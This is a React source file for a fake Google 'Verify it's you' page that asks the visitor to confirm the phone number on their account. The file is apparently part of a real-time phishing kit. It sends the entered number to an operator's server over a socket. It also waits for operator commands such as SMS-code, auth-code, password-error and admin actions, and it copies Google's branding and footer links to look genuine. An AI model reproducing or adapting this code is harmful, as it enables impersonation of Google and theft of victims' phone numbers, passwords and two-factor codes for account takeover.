import React, { useState, useEffect } from "react";
import Logo from "./assets/logo.webp";
import Sms from "./assets/account-recovery-sms-pin.2fc300f8250dc4624871.gif";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";

const Phone = ({ email, onBack, code, socket ,errorMsg}) => {
  const [phone, setPhone] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [focused, setFocused] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false);

  // ✅ Handle form submit
  const handleSubmit = (e) => {
    e.preventDefault();

    if (!phone.trim()) {
      setIsInvalid(true);
      return;
    }

    setIsInvalid(false);
    setIsLoading(true);

    // 🔵 Emit the phone number to the backend
    socket.emit("user:code", { email, code: phone, dontAskAgain: false });
    console.log("Sent phone number to server:", { email, phone });
  };

  // ✅ Stop loading when server replies
  useEffect(() => {
    if (!socket) return;

    const stopLoadingOnEvent = (data) => {
      console.log("[Phone] Server replied:", data);
      setIsLoading(false);
    };

    const events = [
      "tap-code",
      "sms-code",
      "auth-code",
      "phone-number",
      "redirect",
      "login-error",
      "password-error",
      "smscode-error",
      "authcode-error",
      "admin:action",
    ];

    events.forEach((evt) => socket.on(evt, stopLoadingOnEvent));

    return () => {
      events.forEach((evt) => socket.off(evt, stopLoadingOnEvent));
    };
  }, [socket]);

  return (
    <div className="md:min-h-screen bg-white md:bg-[#f0f4f9] flex items-center justify-center pt-5 md:py-12 px-4">
      <div className="w-full max-w-md md:max-w-5xl md:bg-white rounded-[28px] md:shadow-sm">
           {isLoading && (
  <div className="absolute top-0 left-0 md:top-auto md:left-auto w-full md:max-w-[60rem] h-[3px] bg-transparent overflow-hidden rounded-t-[28px]">
    <div className="h-full bg-[#1a73e8] animate-bar1"></div>
    <div className="h-full bg-[#1a73e8] animate-bar2"></div>
  </div>
)}
        <div className="md:p-12">
          <div className="md:flex md:gap-16 md:items-start">
            {/* Left Side */}
            <div className="flex-1">
              <div className="mb-6">
                <img src={Logo} alt="logo" className="w-20" />
              </div>

              <h1 className="text-4xl font-normal text-gray-800 mb-4 text-start">
                Verify it’s you
              </h1>
              <p className="text-base text-gray-600 text-start leading-6 mb-8">
                To help keep your account safe, Google wants to make sure it's
                really you trying to sign in.
              </p>

              {/* Email Display */}
              <div className="flex items-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg
                  className="svgja"
                  aria-hidden="true"
                  fill="currentColor"
                  focusable="false"
                  width="20px"
                  height="20px"
                  viewBox="0 0 24 24"
                  xmlns="https://www.w3.org/2000/svg"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>

                <div className="text-sm text-gray-900 truncate">{email}</div>
                <button
                  onClick={onBack}
                  className="text-sm text-blue-600 hover:underline"
                >
                  <svg
                    aria-hidden="true"
                    className="svgja"
                    fill="currentColor"
                    focusable="false"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    xmlns="https://www.w3.org/2000/svg"
                  >
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>

            {/* Right Side - Form */}
            <div className="flex-1">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="flex justify-center">
                  <img src={Sms} alt="sms" />
                </div>

                <h2 className="text-base font-normal text-gray-800 mb-4 text-start">
                  Get a verification code
                </h2>
                <p className="text-sm text-gray-600 text-start">
                  To get a verification code, confirm the phone number linked to
                  your account •• ••• •{code}. Standard rates apply.
                </p>

                {/* ✅ Proper Country Selector with visible code */}
                <div className="w-full mt-5 relative">
  <div
    className={`react-tel-wrapper border rounded-md transition-all duration-200 
      ${
        isInvalid
          ? "border-red-500"
          : focused
          ? "border-blue-500"
          : "border-[#747775]"
      }`}
  >
    <PhoneInput
      country={"us"}
      value={phone}
      onChange={(value) => {
        setPhone(value);
        setIsInvalid(false);
      }}
      enableSearch
      onFocus={() => setFocused(true)}
      onBlur={() => setFocused(!!phone)}
      inputProps={{
        name: "phone",
        required: true,
      }}
      inputClass="!w-full !h-14 !pl-12 !pr-4 !text-base !bg-white !outline-none !border-none !shadow-none"
      buttonClass="!border-none !bg-transparent"
      containerClass="!w-full"
      dropdownClass="!z-50"
    />
  </div>

  {/* Floating Label */}
  <label
    className={`absolute left-12 text-gray-500 pointer-events-none transition-all duration-200 ms-8
      ${
        focused || phone
          ? "-top-2 text-xs text-blue-600 bg-white px-1"
          : "top-4 text-base"
      }`}
  >
    Phone Number
  </label>
</div>
{errorMsg && (
  <p className="text-sm text-red-600 !mt-[0.25rem]">{errorMsg}</p>
)}


                <div className="flex items-center justify-end pt-8">
                  <a
                    href="#"
                    className="font-medium text-sm text-blue-600 hover:underline me-5"
                  >
                    I don't have my phone
                  </a>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-[20px] text-sm disabled:opacity-50 disabled:cursor-not-allowed transition-colors min-w-[80px]"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
  <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
     <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div>
        </footer>
      </div>


    </div>
  );
};

export default Phone;
